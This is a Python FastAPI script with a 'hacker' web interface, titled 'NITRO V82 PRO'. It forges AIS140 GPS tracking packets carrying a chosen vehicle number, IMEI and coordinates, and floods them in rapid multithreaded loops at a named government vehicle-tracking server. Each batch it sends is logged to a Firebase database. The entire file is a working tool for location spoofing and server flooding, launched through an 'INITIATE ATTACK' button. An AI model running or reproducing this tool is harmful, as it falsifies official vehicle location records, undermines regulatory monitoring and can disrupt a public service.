import socket
import threading
import time
from datetime import datetime, timedelta, timezone
from fastapi import FastAPI
from fastapi.responses import HTMLResponse
import firebase_admin
from firebase_admin import credentials, db

app = FastAPI()

# --- FIREBASE SETUP ---
try:
    cred = credentials.Certificate("serviceAccountKey.json")
    firebase_admin.initialize_app(cred, {
        'databaseURL': 'https://ghop-ghop-gps-injection-default-rtdb.firebaseio.com/'
    })
except Exception as e:
    print(f"Firebase Init Error: {e}")

# --- GLOBAL VARIABLES ---
firing = False
total_sent = 0
logs = []
TARGET_IP = "vlts.bihar.gov.in"
TARGET_PORT = 9999
TAGS = ["RA18", "WTEX", "MARK", "ASPL", "LOCT14A", "ACT1", "AIS140", "VLTD", "AMAZON", "BBOX77", "EGAS", "MENT", "MIJO", "ROADRPA"]

def format_coord(val):
    try:
        p = str(val).split('.')
        return f"{p[0]}.{p[1][:7].ljust(7, '0')}" if len(p) > 1 else f"{val}.0000000"
    except: return val

# --- CORE ENGINE (RAW SOCKET MULTITHREADING) ---
def start_firing(tag_chunk, imei, vno, lat, lon):
    global firing, total_sent, logs
    while firing:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.settimeout(15)
            s.connect((TARGET_IP, TARGET_PORT))
            
            while firing:
                payload = ""
                for tag in tag_chunk:
                    now = datetime.now(timezone.utc) + timedelta(hours=5, minutes=30)
                    dt, tm = now.strftime('%d%m%Y'), now.strftime('%H%M%S')
                    pkt = f"$PVT,{tag},2.1.1,NR,01,L,{imei},{vno},1,{dt},{tm},{format_coord(lat)},N,{format_coord(lon)},E,0.00,0.0,11,73,0.8,0.8,airtel,1,1,11.5,4.3,0,C,26,404,73,0a83,e3c8,e3c7,0a83,7,e3fb,0a83,7,c79d,0a83,10,e3f9,0a83,0,0001,00,000041,DDE3*\r\n"
                    payload += pkt
                
                s.send(payload.encode('ascii'))
                total_sent += len(tag_chunk)
                
                # Update Log
                current_time = (datetime.now(timezone.utc) + timedelta(hours=5, minutes=30)).strftime('%H:%M:%S')
                logs.append(f"[{current_time}] BATCH_SENT: {len(tag_chunk)} TAGS")
                if len(logs) > 10: logs.pop(0)

                # Firebase Async Sync
                db.reference('/Success_Reports').push({
                    'vno': vno,
                    'count': total_sent,
                    'time': current_time
                })
                time.sleep(0.01) # Ultra Fast
        except:
            time.sleep(0.5)
        finally:
            try: s.close()
            except: pass

# --- HACKER INTERFACE (UI) ---
@app.get("/", response_class=HTMLResponse)
async def home():
    return """
    <html><head><title>NITRO V82 PRO</title>
    <style>
        body { background:#000; color:#0f0; font-family:'Courier New', monospace; margin:0; display:flex; justify-content:center; align-items:center; height:100vh; }
        .box { width:420px; border:1px solid #0f0; padding:25px; box-shadow: 0 0 25px #0f0; background:rgba(0,15,0,0.95); border-radius:15px; }
        h2 { text-align:center; letter-spacing:5px; border-bottom:1px solid #0f0; padding-bottom:15px; margin-top:0; text-shadow:0 0 10px #0f0; }
        input { width:100%; background:#000; border:1px solid #0f0; color:#0f0; padding:12px; margin:8px 0; outline:none; font-size:14px; box-sizing:border-box; }
        .btn-row { display:flex; gap:10px; margin-top:15px; }
        button { flex:1; padding:15px; font-weight:bold; cursor:pointer; border:1px solid #0f0; background:transparent; color:#0f0; text-transform:uppercase; transition:0.3s; }
        button:hover { background:#0f0; color:#000; box-shadow: 0 0 15px #0f0; }
        #terminal { height:180px; background:#001100; border:1px dotted #0f0; margin-top:20px; padding:12px; font-size:12px; overflow:hidden; line-height:1.5; color:#00ff41; }
        .stats-bar { display:flex; justify-content:space-between; margin-top:15px; font-weight:bold; font-size:13px; color:#fff; }
        .blink { animation: blinker 1s linear infinite; }
        @keyframes blinker { 50% { opacity: 0; } }
    </style></head>
    <body>
        <div class="box">
            <h2>NITRO V82 PRO</h2>
            <input type="text" id="v" value="UP51T8261">
            <input type="text" id="i" value="358980101447242">
            <div style="display:flex; gap:10px;"><input type="text" id="lt" value="25.6501550"><input type="text" id="ln" value="84.7851780"></div>
            <div class="btn-row">
                <button onclick="start()">INITIATE ATTACK</button>
                <button onclick="stop()" style="color:#f00; border-color:#f00;">ABORT</button>
            </div>
            <div id="terminal">SYSTEM STATUS: READY_TO_INJECT...</div>
            <div class="stats-bar">
                <span>PACKETS: <span id="c">0</span></span>
                <span id="st" style="color:#0f0">IDLE</span>
            </div>
        </div>
        <script>
            let monitor;
            function start() {
                const params = `vno=${document.getElementById('v').value}&imei=${document.getElementById('i').value}&lat=${document.getElementById('lt').value}&lon=${document.getElementById('ln').value}`;
                fetch(`/init_fire?${params}`);
                document.getElementById('st').innerText = "RUNNING";
                document.getElementById('st').className = "blink";
                if(!monitor) monitor = setInterval(refresh, 1000);
            }
            function stop() {
                fetch('/kill_fire');
                document.getElementById('st').innerText = "STOPPED";
                document.getElementById('st').className = "";
                clearInterval(monitor); monitor = null;
            }
            function refresh() {
                fetch('/get_logs').then(r=>r.json()).then(d=>{
                    document.getElementById('c').innerText = d.count;
                    document.getElementById('terminal').innerHTML = d.logs.join("<br>");
                });
            }
        </script>
    </body></html>
    """

# --- API ENDPOINTS ---
@app.get("/init_fire")
def init_fire(imei: str, vno: str, lat: str, lon: str):
    global firing, total_sent, logs
    if not firing:
        firing, total_sent, logs = True, 0, ["STREAMS INITIALIZING..."]
        # Splitting into 4 independent threads
        chunks = [TAGS[i:i + 4] for i in range(0, len(TAGS), 4)]
        for chunk in chunks:
            t = threading.Thread(target=start_firing, args=(chunk, imei, vno.upper(), lat, lon))
            t.daemon = True
            t.start()
    return {"status": "ok"}

@app.get("/kill_fire")
def kill_fire():
    global firing
    firing = False
    return {"status": "stopped"}

@app.get("/get_logs")
def get_logs():
    return {"count": total_sent, "logs": logs}
